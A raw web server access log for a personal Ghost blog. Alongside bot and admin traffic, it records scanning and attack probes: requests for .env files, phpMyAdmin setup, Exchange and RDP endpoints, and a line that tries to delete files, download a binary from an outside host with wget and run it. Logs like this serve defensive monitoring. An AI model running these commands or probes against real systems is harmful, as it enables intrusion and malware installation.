89.248.173.131 - - [20/Feb/2022:02:04:24 +0100] "GET /remote/login?lang=en HTTP/1.1" 200 595 "-" "python-requests/2.21.0"
83.29.123.238 - - [22/Feb/2022:20:19:46 +0100] "GET /ghost/api/canary/admin/snippets/?limit=all HTTP/2.0" 200 106 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.62"
83.29.123.238 - - [22/Feb/2022:20:21:56 +0100] "PUT /ghost/api/canary/admin/pages/61d6d97b024ed40001401c74/ HTTP/2.0" 200 1286 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.62"
185.180.143.137 - - [22/Feb/2022:21:17:14 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.137 - - [22/Feb/2022:21:17:14 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
20.191.45.212 - - [22/Feb/2022:21:34:37 +0100] "GET / HTTP/1.1" 301 162 "http://krzwiatrzyk.eu/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
20.191.45.212 - - [22/Feb/2022:21:34:38 +0100] "GET / HTTP/1.1" 200 13265 "https://krzwiatrzyk.eu/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
20.191.45.212 - - [22/Feb/2022:21:34:38 +0100] "GET /favicon.png HTTP/1.1" 200 2741 "https://krzwiatrzyk.eu/favicon.png" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
81.17.24.154 - - [22/Feb/2022:21:44:55 +0100] "GET / HTTP/1.1" 400 248 "-" "-"
81.17.24.154 - - [22/Feb/2022:21:44:55 +0100] "POST /HNAP1/ HTTP/1.1" 400 248 "-" "Mozila/5.0"
3.234.213.86 - - [22/Feb/2022:21:54:25 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.234.213.86 - - [22/Feb/2022:21:54:25 +0100] "GET /rss/ HTTP/1.1" 200 4453 "-" "Forem Feeds Importer"
209.141.52.239 - - [22/Feb/2022:22:45:15 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
66.115.107.244 - - [22/Feb/2022:22:58:48 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://2.56.57.7/.s4y/arm;sh+/tmp/arm HTTP/1.1" 301 162 "-" "Hello, world"
86.5.55.145 - - [22/Feb/2022:23:05:22 +0100] "GET http://httpheader.net/azenv.php HTTP/1.0" 301 162 "-" "-"
178.239.21.185 - - [22/Feb/2022:23:15:06 +0100] "HEAD /robots.txt HTTP/1.0" 301 0 "-" "-"
78.128.112.14 - - [22/Feb/2022:23:52:00 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
109.248.6.76 - - [22/Feb/2022:23:57:12 +0100] "GET /favicon.ico HTTP/1.0" 200 1345 "-" "masscan-ng/1.3 (https://github.com/bi-zone/masscan-ng)"
194.165.16.77 - - [23/Feb/2022:00:07:09 +0100] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 150 "-" "-"
194.165.16.77 - - [23/Feb/2022:00:07:09 +0100] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 150 "-" "-"
20.97.252.0 - - [23/Feb/2022:00:12:11 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.97.252.0 - - [23/Feb/2022:00:12:11 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
62.233.50.179 - - [23/Feb/2022:00:35:15 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
205.185.125.167 - - [23/Feb/2022:01:03:37 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
157.55.39.20 - - [23/Feb/2022:01:04:05 +0100] "GET / HTTP/2.0" 200 13252 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
89.163.231.26 - - [23/Feb/2022:01:10:49 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
89.163.231.26 - - [23/Feb/2022:01:10:49 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.250.19.242 - - [23/Feb/2022:01:16:50 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
23.250.19.242 - - [23/Feb/2022:01:16:50 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "-"
23.250.19.242 - - [23/Feb/2022:01:16:51 +0100] "GET /sitemap.xml HTTP/1.1" 301 162 "-" "-"
23.250.19.242 - - [23/Feb/2022:01:16:53 +0100] "GET /.well-known/security.txt HTTP/1.1" 301 162 "-" "-"
23.250.19.242 - - [23/Feb/2022:01:16:55 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
23.250.19.242 - - [23/Feb/2022:01:16:56 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
23.250.19.242 - - [23/Feb/2022:01:16:57 +0100] "\x03\xF8|\x15b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 150 "-" "-"
35.195.93.98 - - [23/Feb/2022:01:16:59 +0100] "GET / HTTP/1.1" 301 162 "-" "python-requests/2.27.1"
89.248.165.244 - - [23/Feb/2022:01:18:58 +0100] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00" 400 150 "-" "-"
89.248.165.244 - - [23/Feb/2022:01:19:18 +0100] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00" 400 150 "-" "-"
192.241.213.175 - - [23/Feb/2022:01:23:31 +0100] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
89.163.231.26 - - [23/Feb/2022:01:25:08 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
89.163.231.26 - - [23/Feb/2022:01:25:09 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.209.53 - - [23/Feb/2022:01:29:56 +0100] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
185.180.143.74 - - [23/Feb/2022:01:36:22 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
192.241.206.232 - - [23/Feb/2022:01:41:29 +0100] "GET /ReportServer HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
66.249.66.77 - - [23/Feb/2022:01:47:04 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.77 - - [23/Feb/2022:01:47:04 +0100] "GET /sitemap.xml HTTP/1.1" 200 642 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
192.241.212.88 - - [23/Feb/2022:01:49:46 +0100] "GET /login HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
34.140.248.32 - - [23/Feb/2022:02:05:20 +0100] "GET / HTTP/1.1" 301 162 "-" "python-requests/2.27.1"
111.185.151.91 - - [23/Feb/2022:02:16:51 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
14.102.51.246 - - [23/Feb/2022:02:18:20 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
87.241.132.8 - - [23/Feb/2022:02:37:14 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
114.119.130.61 - - [23/Feb/2022:02:40:09 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
45.129.18.55 - - [23/Feb/2022:02:49:13 +0100] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
45.129.18.151 - - [23/Feb/2022:02:49:14 +0100] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
3.234.213.86 - - [23/Feb/2022:02:53:10 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.234.213.86 - - [23/Feb/2022:02:53:10 +0100] "GET /rss/ HTTP/1.1" 200 4453 "-" "Forem Feeds Importer"
23.250.19.242 - - [23/Feb/2022:02:53:17 +0100] "GET / HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
23.250.19.242 - - [23/Feb/2022:02:53:46 +0100] "" 400 0 "-" "-"
23.250.19.242 - - [23/Feb/2022:02:53:46 +0100] "" 400 0 "-" "-"
23.250.19.242 - - [23/Feb/2022:02:53:46 +0100] "" 400 0 "-" "-"
23.250.19.242 - - [23/Feb/2022:02:53:52 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 1345 "-" "-"
23.250.19.242 - - [23/Feb/2022:02:53:54 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
23.250.19.242 - - [23/Feb/2022:02:53:55 +0100] "" 400 0 "-" "-"
23.250.19.242 - - [23/Feb/2022:02:53:57 +0100] "\x03\xB2\x93\x15b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 150 "-" "-"
35.233.62.116 - - [23/Feb/2022:02:55:03 +0100] "GET / HTTP/1.1" 400 248 "-" "python-requests/2.27.1"
209.141.52.239 - - [23/Feb/2022:03:19:22 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
114.119.146.185 - - [23/Feb/2022:03:29:58 +0100] "GET /weekly-stories-3/ HTTP/1.1" 200 15777 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
194.165.16.37 - - [23/Feb/2022:03:48:07 +0100] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 150 "-" "-"
194.165.16.37 - - [23/Feb/2022:03:48:07 +0100] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 150 "-" "-"
172.105.89.161 - - [23/Feb/2022:04:34:03 +0100] "GET /0bef HTTP/1.0" 301 162 "-" "-"
208.138.25.30 - - [23/Feb/2022:04:36:40 +0100] "POST /spywall/timeConfig.php HTTP/1.1" 400 150 "-" "XTC"
172.105.89.161 - - [23/Feb/2022:04:36:41 +0100] "GET /0bef HTTP/1.0" 400 248 "-" "-"
192.241.212.88 - - [23/Feb/2022:04:44:19 +0100] "GET /actuator/health HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
62.233.50.179 - - [23/Feb/2022:04:51:32 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
209.141.62.127 - - [23/Feb/2022:04:53:53 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
173.63.188.95 - - [23/Feb/2022:05:04:52 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
173.63.188.95 - - [23/Feb/2022:05:04:56 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.61.19 - - [23/Feb/2022:05:21:16 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
216.218.206.69 - - [23/Feb/2022:06:04:43 +0100] "GET / HTTP/1.1" 200 1345 "-" "-"
205.185.125.167 - - [23/Feb/2022:06:54:08 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
66.249.66.79 - - [23/Feb/2022:07:41:38 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.79 - - [23/Feb/2022:07:41:38 +0100] "GET /sitemap-posts.xml HTTP/1.1" 200 427 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
103.203.57.10 - - [23/Feb/2022:07:52:52 +0100] "GET / HTTP/1.1" 200 1345 "-" "HTTP Banner Detection (https://security.ipip.net)"
3.239.240.50 - - [23/Feb/2022:07:52:53 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.239.240.50 - - [23/Feb/2022:07:52:53 +0100] "GET /rss/ HTTP/1.1" 200 4453 "-" "Forem Feeds Importer"
202.178.115.67 - - [23/Feb/2022:08:20:18 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
